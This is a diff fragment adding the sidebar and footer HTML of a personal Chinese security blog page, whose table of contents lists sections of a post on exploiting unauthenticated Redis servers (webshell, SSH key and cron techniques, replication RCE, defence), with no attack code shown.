+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#redis未授权漏洞利用"><span class="nav-number">1.</span> <span class="nav-text">redis未授权漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-背景"><span class="nav-number">1.1.</span> <span class="nav-text">1. 背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-利用"><span class="nav-number">1.2.</span> <span class="nav-text">2. 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-利用写文件getshell"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 利用写文件getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-写webshell"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">2.1.1 写webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-写ssh公钥"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">2.1.2 写ssh公钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-3-写定时任务反弹shell"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">2.1.3 写定时任务反弹shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-基于主从复制实现rce"><span class="nav-number">1.3.</span> <span class="nav-text">2.2 基于主从复制实现rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-防御"><span class="nav-number">1.4.</span> <span class="nav-text">3. 防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-参考"><span class="nav-number">1.5.</span> <span class="nav-text">4. 参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Liu Mingyi"
+      src="/images/lmy.jpg">
+  <p class="site-author-name" itemprop="name">Liu Mingyi</p>
+  <div class="site-description" itemprop="description">我的邮箱是liumingyi0809@gmail.com,欢迎技术讨论</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/null" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-lmy"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lmy</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/clicklove.js"></script>
+</body>
+</html>
